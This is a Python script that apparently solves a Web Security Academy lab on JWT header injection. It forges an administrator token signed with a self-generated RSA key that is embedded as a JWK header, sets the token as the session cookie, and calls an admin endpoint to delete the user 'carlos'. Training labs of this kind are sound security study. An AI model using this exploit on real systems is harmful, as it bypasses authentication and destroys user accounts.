from web_security_academy.core.logger import logger

from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from jose import jwk, constants

import json
import jwt


def solve_lab(session):
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()
    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    logger.info("Generated asymmetric key pair, including public key PEM")

    json_web_token = jwk.RSAKey(
        algorithm=constants.Algorithms.RS256, key=pem.decode()
    ).to_dict()
    logger.info("Created JWK using public key PEM")

    payload = {"sub": "administrator"}
    token = jwt.encode(
        payload, private_key, algorithm="RS256", headers={"jwk": json_web_token}
    )
    logger.info(
        "Encoded the following payload as a JWT (includes JWK header + private key signing):"
    )
    logger.info(payload)

    session.cookies.set("session", token)
    logger.info(f"Set the session cookie to signed JWT")

    session.get_path("/admin/delete?username=carlos")
    logger.info('Deleted user "carlos"')
